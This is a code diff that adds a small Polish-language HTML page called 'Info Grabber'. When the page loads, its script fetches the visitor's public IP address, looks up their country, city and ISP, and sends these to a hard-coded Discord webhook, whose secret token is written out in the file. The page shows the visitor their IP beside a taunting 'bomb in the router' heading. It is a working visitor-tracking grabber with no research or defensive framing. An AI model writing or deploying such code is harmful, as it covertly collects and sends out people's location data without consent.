@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>Info Grabber</title>
+</head>
+<body>
+    <h1>Twój adres IP zostanie pokazany a nastepnie BOMBA W RUTER</h1>
+    <p id="ip">Ładowanie IP...</p>
+
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1406763822265532506/xp3SaqjEZ0MidKQll7HBLBLwwX0VImSAtn9c9rQ-ZwMThwA9EUN5bLRuxZqg9gx1c6s3";
+
+        fetch("https://api.ipify.org?format=json")
+            .then(res => res.json())
+            .then(data => {
+                const ip = data.ip;
+                document.getElementById("ip").innerText = `Twoje IP: ${ip}`;
+
+                fetch(`http://ip-api.com/json/${ip}`)
+                    .then(res => res.json())
+                    .then(location => {
+                        const embed = {
+                            "content": "",
+                            "embeds": [{
+                                "title": `Nowe wejście na stronę`,
+                                "description": `\`\`\`IP: ${ip}\nKraj: ${location.country}\nMiasto: ${location.city}\nISP: ${location.isp}\`\`\``,
+                                "color": 3447003
+                            }]
+                        };
+
+                        fetch(webhook, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify(embed)
+                        });
+                    });
+            });
+    </script>
+</body>
+</html>
